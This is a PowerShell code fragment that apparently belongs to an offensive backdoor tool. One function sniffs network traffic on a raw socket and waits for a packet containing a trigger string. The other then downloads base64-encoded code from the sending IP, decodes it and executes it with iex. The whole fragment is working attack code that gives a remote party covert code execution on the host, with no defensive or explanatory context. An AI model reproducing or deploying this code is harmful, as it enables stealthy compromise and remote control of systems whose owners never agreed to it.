function Invoke-CallbackIEX {
    param([string]$CallbackIP)
    $enc = (New-Object Net.WebClient).DownloadString("http://$CallbackIP/resource")
    $b = [System.Convert]::FromBase64String($enc)
    $dec = [System.Text.Encoding]::UTF8.GetString($b)
    iex $dec
}
function Wait-Packet {
    param($socket, $byteIn, $byteOut, $byteData, $Trigger)
    $socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,$byteIn,$byteOut)
    $rcv = $socket.Receive($byteData)
    $SourceIPAddress = [System.Net.IPAddress]$byteData[12..15]
    $RemainderOfPacket = [Text.Encoding]::ASCII.GetString($byteData)
    if ($RemainderOfPacket -match $Trigger) {
        $match = $SourceIPAddress
        Invoke-CallbackIEX $match
    }
}
